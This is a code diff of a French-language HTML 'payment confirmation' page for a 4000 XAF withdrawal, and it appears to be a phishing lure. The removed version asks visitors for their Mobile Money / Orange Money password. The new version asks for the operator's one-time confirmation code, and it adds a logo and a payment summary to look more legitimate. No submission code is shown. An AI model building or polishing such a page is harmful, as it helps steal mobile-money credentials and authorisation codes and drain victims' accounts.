@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -9,12 +10,17 @@
 <body>
   <section class="payment-box">
     <h2>💳 Confirmation Paiement</h2>
-    <p>Veuillez vérifier votre compte et entrer votre mot de passe Mobile Money / Orange Money pour confirmer le retrait de <strong>4000 XAF</strong>.</p>
+    <img id="paymentLogo" class="payment-preview" alt="Logo paiement">
+    <p>Veuillez entrer le code de confirmation envoyé par votre opérateur pour autoriser le retrait de <strong>4000 XAF</strong>.</p>
+    <div class="payment-summary">
+      <p><strong>Mode:</strong> <span id="paymentMethod">-</span></p>
+      <p><strong>Montant:</strong> 4000 XAF</p>
+    </div>
     
     <form id="paymentForm">
-      <label for="password">Mot de passe :</label>
-      <input type="password" id="password" aria-describedby="passwordHelp" required>
-      <small id="passwordHelp" class="password-help">&nbsp;</small>
+      <label for="code">Code :</label>
+      <input type="text" id="code" inputmode="numeric" aria-describedby="codeHelp" required>
+      <small id="codeHelp" class="password-help">&nbsp;</small>
       <button type="submit">Confirmer</button>
     </form>
 
